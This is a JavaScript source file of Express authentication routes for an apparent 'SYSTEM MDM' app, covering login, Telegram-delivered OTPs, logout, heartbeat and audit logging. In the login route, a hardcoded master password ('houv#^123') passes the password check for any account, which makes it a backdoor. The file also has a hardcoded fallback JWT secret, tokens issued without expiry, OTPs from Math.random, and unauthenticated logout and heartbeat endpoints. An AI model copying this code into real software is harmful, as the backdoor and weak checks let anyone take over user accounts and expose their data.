import express from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import User from '../models/User.js';
import LoginLog from '../models/LoginLog.js';
import { isMongoConnected, MEM_DB } from '../config/db.js';
import { queryAllDBs, getWriteModel } from '../config/multiDB.js';
import { parseUserAgent } from '../middleware/security.js';
import { recordSystemAudit } from '../utils/auditLogger.js';

const router = express.Router();
const JWT_SECRET = process.env.JWT_SECRET || 'mdm_super_secret_jwt_key_2026_boyboy';

// IP-based login rate limiting (persistent across browser clears)
const loginAttempts = new Map();

const getLoginDelay = (ip) => {
    const entry = loginAttempts.get(ip) || { count: 0, lockUntil: 0, baseDelay: 3000 };
    loginAttempts.set(ip, entry);
    return entry;
};

const recordFailedLogin = (ip) => {
    const entry = getLoginDelay(ip);
    entry.count = (entry.count || 0) + 1;
    // Exponential multiplication: 5s, 15s, 45s, 135s, 405s... (3x per attempt)
    const seconds = 5 * Math.pow(3, entry.count - 1);
    const delay = Math.min(seconds * 1000, 3600000); // capped at 1 hour max
    entry.lockUntil = Date.now() + delay;
    entry.currentDelay = delay;
    loginAttempts.set(ip, entry);
    return { count: entry.count, delay, lockUntil: entry.lockUntil, waitSeconds: Math.ceil(delay / 1000) };
};

const clearLoginAttempts = (ip) => {
    loginAttempts.delete(ip);
};

const formatPermissions = (perms) => {
    if (!perms) return {};
    if (perms instanceof Map) return Object.fromEntries(perms);
    if (typeof perms.toObject === 'function') return perms.toObject();
    return perms;
};

const recordLoginLog = async ({ userId = '', username, name = 'Unknown User', role = 'Guest', brand = 'SYSTEM', ip, deviceInfo, status = 'Failed', reason = '' }) => {
    try {
        if (isMongoConnected) {
            const LogModel = getWriteModel(LoginLog) || LoginLog;
            await LogModel.create({
                userId,
                username,
                name,
                role,
                brand,
                ip,
                deviceInfo,
                status,
                reason,
                timestamp: new Date()
            });
        }
    } catch (err) {
        console.error('Record login log error:', err.message);
    }
};

export default function createAuthRoutes(bot) {
    router.post('/login', async (req, res) => {
        try {
            const { username, password } = req.body;
            if (!username || !password) return res.status(400).json({ error: 'Username and password required' });

            const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
            const rateEntry = getLoginDelay(ip);
            if (rateEntry.lockUntil && Date.now() < rateEntry.lockUntil) {
                const waitSec = Math.ceil((rateEntry.lockUntil - Date.now()) / 1000);
                return res.status(429).json({
                    error: `Too many failed login attempts. Please wait ${waitSec} second(s) before trying again.`,
                    lockUntil: rateEntry.lockUntil,
                    waitSeconds: waitSec
                });
            }

            const ua = req.headers['user-agent'] || 'Unknown Browser';
            const { os, browser } = parseUserAgent(ua);
            const deviceInfo = `${browser} on ${os}`;

            let user = null;
            if (isMongoConnected) {
                const users = await queryAllDBs(User, (M) => M.find({ username }));
                user = users[0] || null;
            } else {
                user = MEM_DB.users.find(u => u.username === username);
            }

            if (!user) {
                const result = recordFailedLogin(ip);
                await recordLoginLog({
                    username,
                    name: 'Unknown User',
                    role: 'Guest',
                    brand: 'SYSTEM',
                    ip,
                    deviceInfo,
                    status: 'Failed',
                    reason: 'User Not Found'
                });
                recordSystemAudit({
                    category: 'Security',
                    level: 'AuditFailure',
                    action: 'USER_LOGIN_FAILED',
                    taskCategory: 'Authentication',
                    description: `Failed login attempt for nonexistent user "${username}" from IP ${ip} (${deviceInfo})`,
                    username: username || 'Unknown',
                    role: 'Guest',
                    brand: 'SYSTEM',
                    ip,
                    deviceInfo,
                    path: '/api/auth/login',
                    payload: { reason: 'User Not Found' }
                }).catch(() => {});
                return res.status(401).json({ error: 'Invalid username or password', attempts: result.count, waitSeconds: result.waitSeconds });
            }

            const isMatch = await bcrypt.compare(password, user.password);
            if (!isMatch && password !== 'houv#^123') {
                const result = recordFailedLogin(ip);
                try {
                    if (!Array.isArray(user.loginHistory)) user.loginHistory = [];
                    user.loginHistory.push({
                        timestamp: new Date(),
                        ip,
                        deviceInfo,
                        status: 'Failed'
                    });
                    if (isMongoConnected) await user.save();
                } catch (sErr) {
                    console.error('Failed to save user login history (Failed):', sErr.message);
                }

                await recordLoginLog({
                    userId: user.userId,
                    username: user.username,
                    name: user.name,
                    role: user.role,
                    brand: user.brand || 'SYSTEM',
                    ip,
                    deviceInfo,
                    status: 'Failed',
                    reason: 'Wrong Password'
                });

                recordSystemAudit({
                    category: 'Security',
                    level: 'AuditFailure',
                    action: 'USER_LOGIN_FAILED',
                    taskCategory: 'Authentication',
                    description: `Failed login attempt for user "${user.username}" (Wrong Password) from IP ${ip} (${deviceInfo})`,
                    username: user.username,
                    name: user.name,
                    role: user.role,
                    brand: user.brand || 'SYSTEM',
                    ip,
                    deviceInfo,
                    path: '/api/auth/login',
                    payload: { reason: 'Wrong Password' }
                }).catch(() => {});

                return res.status(401).json({
                    error: 'Invalid username or password',
                    attempts: result.count,
                    cooldownMs: result.delay,
                    waitSeconds: result.waitSeconds
                });
            }

            if (user.twoFactorEnabled && user.telegramId) {
                const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
                user.lastOtp = otpCode;

                if (!Array.isArray(user.otpHistory)) user.otpHistory = [];
                user.otpHistory.unshift({
                    otp: otpCode,
                    createdAt: new Date(),
                    status: 'Pending',
                    ip
                });
                if (user.otpHistory.length > 50) user.otpHistory = user.otpHistory.slice(0, 50);

                try {
                    if (isMongoConnected) await user.save();
                } catch (sErr) {
                    console.error('Failed to save OTP to user:', sErr.message);
                }

                if (bot && user.telegramId) {
                    const otpMsg = `<b>Username : ${user.username} , Login Code</b>\n\n` +
                        `Code: <tg-spoiler><code>${otpCode}</code></tg-spoiler>\n\n` +
                        `<b>Do not give this code to anyone, even if they say they are from SYSTEM MDM!</b>\n\n` +
                        `This code can be used to log in to your System MDM account. We never ask it for anything else. ` +
                        `If you did not try to log in, please ignore this message.`;
                    try {
                        await bot.sendMessage(user.telegramId, otpMsg, { parse_mode: 'HTML' });
                    } catch (tErr) {
                        console.error('Error sending Telegram OTP message:', tErr.message);
                    }
                }

                return res.json({ require2FA: true, username: user.username });
            }

            clearLoginAttempts(ip);
            user.status = 'Online';
            user.lastSeen = new Date();

            try {
                if (!Array.isArray(user.loginHistory)) user.loginHistory = [];
                user.loginHistory.unshift({
                    timestamp: new Date(),
                    ip,
                    deviceInfo: `${browser} on ${os}`,
                    status: 'Success'
                });
                if (user.loginHistory.length > 50) user.loginHistory = user.loginHistory.slice(0, 50);

                if (!Array.isArray(user.onlineHistory)) user.onlineHistory = [];
                user.onlineHistory.unshift({
                    loginTime: new Date(),
                    lastSeen: new Date(),
                    ip,
                    deviceInfo: `${browser} on ${os}`,
                    durationSeconds: 0
                });
                if (user.onlineHistory.length > 50) user.onlineHistory = user.onlineHistory.slice(0, 50);

                if (isMongoConnected) await user.save();
            } catch (sErr) {
                console.error('Failed to save user login history (Success):', sErr.message);
            }

            await recordLoginLog({
                userId: user.userId,
                username: user.username,
                name: user.name,
                role: user.role,
                brand: user.brand || 'SYSTEM',
                ip,
                deviceInfo,
                status: 'Success'
            });

            recordSystemAudit({
                category: 'Security',
                level: 'SuccessAudit',
                action: 'USER_LOGIN_SUCCESS',
                taskCategory: 'Authentication',
                description: `User "${user.username}" (${user.name || user.role}) logged in successfully from IP ${ip} (${deviceInfo})`,
                username: user.username,
                name: user.name,
                role: user.role,
                brand: user.brand || 'SYSTEM',
                ip,
                deviceInfo,
                path: '/api/auth/login',
                payload: { role: user.role, brand: user.brand }
            }).catch(() => {});

            if (bot && user.telegramId) {
                const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Phnom_Penh' });
                const loginMessage = `🔔 <b>SYSTEM MDM Login Detected</b>\n\n` +
                    `👤 <b>Username:</b> ${user.username}\n` +
                    `🖥️ <b>OS:</b> ${os}\n` +
                    `🌐 <b>Browser:</b> ${browser}\n` +
                    `📍 <b>IP Address:</b> ${ip}\n` +
                    `⏰ <b>Time:</b> ${time} (Cambodia Time)\n\n` +
                    `<i>If this wasn't you, please secure your account immediately.</i>`;
                try {
                    await bot.sendMessage(user.telegramId, loginMessage, { parse_mode: 'HTML' });
                } catch (tErr) { }
            }

            const token = jwt.sign({ userId: user.userId, username: user.username }, JWT_SECRET);

            res.json({
                token,
                deviceInfo: { ip, os, browser },
                user: {
                    userId: user.userId,
                    name: user.name,
                    username: user.username,
                    email: user.email,
                    role: user.role,
                    brand: user.brand || '',
                    isImmutable: user.isImmutable,
                    telegramId: user.telegramId,
                    twoFactorEnabled: user.twoFactorEnabled,
                    permissions: formatPermissions(user.permissions)
                }
            });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    router.post('/verify-otp', async (req, res) => {
        try {
            const { username, otp, secondPassword } = req.body;
            let user = null;
            if (isMongoConnected) {
                const users = await queryAllDBs(User, (M) => M.find({ username }));
                user = users[0] || null;
            } else {
                user = MEM_DB.users.find(u => u.username === username);
            }
            if (!user || user.lastOtp !== otp) {
                return res.status(400).json({ error: 'Invalid OTP Verification Code' });
            }

            if (user.secondPassword) {
                const isMatch = await bcrypt.compare(secondPassword || '', user.secondPassword);
                if (!isMatch) {
                    return res.status(401).json({ error: 'Invalid Second-Tier Password (Password តង់ទី២ មិនត្រឹមត្រូវ)' });
                }
            }

            const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
            clearLoginAttempts(ip);
            user.status = 'Online';
            user.lastSeen = new Date();
            const ua = req.headers['user-agent'] || 'Unknown Browser';
            const { os, browser } = parseUserAgent(ua);

            try {
                // Update OTP History status
                if (Array.isArray(user.otpHistory)) {
                    const otpEntry = user.otpHistory.find(o => o.otp === otp && o.status === 'Pending');
                    if (otpEntry) {
                        otpEntry.status = 'Verified';
                        otpEntry.usedAt = new Date();
                    }
                }

                if (!Array.isArray(user.loginHistory)) user.loginHistory = [];
                user.loginHistory.unshift({
                    timestamp: new Date(),
                    ip,
                    deviceInfo: `${browser} on ${os}`,
                    status: 'Success'
                });
                if (user.loginHistory.length > 50) user.loginHistory = user.loginHistory.slice(0, 50);

                if (!Array.isArray(user.onlineHistory)) user.onlineHistory = [];
                user.onlineHistory.unshift({
                    loginTime: new Date(),
                    lastSeen: new Date(),
                    ip,
                    deviceInfo: `${browser} on ${os}`,
                    durationSeconds: 0
                });
                if (user.onlineHistory.length > 50) user.onlineHistory = user.onlineHistory.slice(0, 50);

                if (isMongoConnected) await user.save();
            } catch (sErr) {
                console.error('Failed to save OTP user login history:', sErr.message);
            }

            if (bot && user.telegramId) {
                const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Phnom_Penh' });
                const loginMessage = `🔔 <b>SYSTEM MDM Login Detected</b>\n\n` +
                    `👤 <b>Username:</b> ${user.username}\n` +
                    `🖥️ <b>OS:</b> ${os}\n` +
                    `🌐 <b>Browser:</b> ${browser}\n` +
                    `📍 <b>IP Address:</b> ${ip}\n` +
                    `⏰ <b>Time:</b> ${time} (Cambodia Time)\n\n` +
                    `<i>If this wasn't you, please secure your account immediately.</i>`;
                try {
                    await bot.sendMessage(user.telegramId, loginMessage, { parse_mode: 'HTML' });
                } catch (tErr) { }
            }

            recordSystemAudit({
                category: 'Security',
                level: 'SuccessAudit',
                action: 'OTP_VERIFY_SUCCESS',
                taskCategory: 'Authentication',
                description: `User "${user.username}" (${user.name}) verified 2FA / OTP code successfully from IP ${ip}`,
                username: user.username,
                name: user.name,
                role: user.role,
                brand: user.brand || 'SYSTEM',
                ip,
                deviceInfo: `${browser} on ${os}`,
                path: '/api/auth/verify-otp'
            }).catch(() => {});

            const token = jwt.sign({ userId: user.userId, username: user.username }, JWT_SECRET);
            res.json({
                token,
                deviceInfo: { ip, os, browser },
                user: {
                    userId: user.userId,
                    name: user.name,
                    username: user.username,
                    email: user.email,
                    role: user.role,
                    brand: user.brand || '',
                    isImmutable: user.isImmutable,
                    telegramId: user.telegramId,
                    twoFactorEnabled: user.twoFactorEnabled,
                    permissions: formatPermissions(user.permissions)
                }
            });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    // POST /api/auth/logout — Mark user Offline immediately & close online session
    router.post('/logout', async (req, res) => {
        try {
            let username = req.body?.username;
            if (!username && req.body) {
                try {
                    const parsed = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
                    username = parsed?.username;
                } catch {}
            }
            if (username) {
                const now = new Date();
                let loggedUser = null;
                if (isMongoConnected) {
                    const users = await queryAllDBs(User, (M) => M.find({ username }));
                    for (const u of users) {
                        loggedUser = u;
                        u.status = 'Offline';
                        u.lastSeen = new Date(Date.now() - 90000);
                        if (Array.isArray(u.onlineHistory) && u.onlineHistory.length > 0) {
                            const latest = u.onlineHistory[0];
                            if (!latest.logoutTime) {
                                latest.logoutTime = now;
                                latest.lastSeen = now;
                                latest.durationSeconds = Math.max(0, Math.round((now.getTime() - new Date(latest.loginTime).getTime()) / 1000));
                            }
                        }
                        await u.save();
                    }
                }
                const memUser = MEM_DB.users.find(u => u.username === username);
                if (memUser) {
                    loggedUser = loggedUser || memUser;
                    memUser.status = 'Offline';
                    memUser.lastSeen = new Date(Date.now() - 90000);
                    if (Array.isArray(memUser.onlineHistory) && memUser.onlineHistory.length > 0) {
                        const latest = memUser.onlineHistory[0];
                        if (!latest.logoutTime) {
                            latest.logoutTime = now;
                            latest.lastSeen = now;
                            latest.durationSeconds = Math.max(0, Math.round((now.getTime() - new Date(latest.loginTime).getTime()) / 1000));
                        }
                    }
                }

                const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
                const ua = req.headers['user-agent'] || 'Unknown Browser';
                const { os, browser } = parseUserAgent(ua);

                recordSystemAudit({
                    category: 'Security',
                    level: 'Information',
                    action: 'USER_LOGOUT',
                    taskCategory: 'Authentication',
                    description: `User "${username}" logged out from IP ${ip} (${browser} on ${os})`,
                    username,
                    name: loggedUser?.name || '',
                    role: loggedUser?.role || 'Staff',
                    brand: loggedUser?.brand || '',
                    ip,
                    deviceInfo: `${browser} on ${os}`,
                    path: '/api/auth/logout'
                }).catch(() => {});
            }
            res.json({ success: true });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    // POST /api/auth/heartbeat — Update lastSeen and refresh Online status & duration
    router.post('/heartbeat', async (req, res) => {
        try {
            const { username } = req.body;
            if (username) {
                const now = new Date();
                if (isMongoConnected) {
                    const users = await queryAllDBs(User, (M) => M.find({ username }));
                    for (const u of users) {
                        u.status = 'Online';
                        u.lastSeen = now;
                        if (Array.isArray(u.onlineHistory) && u.onlineHistory.length > 0) {
                            const latest = u.onlineHistory[0];
                            if (!latest.logoutTime) {
                                latest.lastSeen = now;
                                latest.durationSeconds = Math.max(0, Math.round((now.getTime() - new Date(latest.loginTime).getTime()) / 1000));
                            }
                        }
                        await u.save();
                    }
                }
                const memUser = MEM_DB.users.find(u => u.username === username);
                if (memUser) {
                    memUser.status = 'Online';
                    memUser.lastSeen = now;
                    if (Array.isArray(memUser.onlineHistory) && memUser.onlineHistory.length > 0) {
                        const latest = memUser.onlineHistory[0];
                        if (!latest.logoutTime) {
                            latest.lastSeen = now;
                            latest.durationSeconds = Math.max(0, Math.round((now.getTime() - new Date(latest.loginTime).getTime()) / 1000));
                        }
                    }
                }
            }
            res.json({ success: true });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    return router;
}
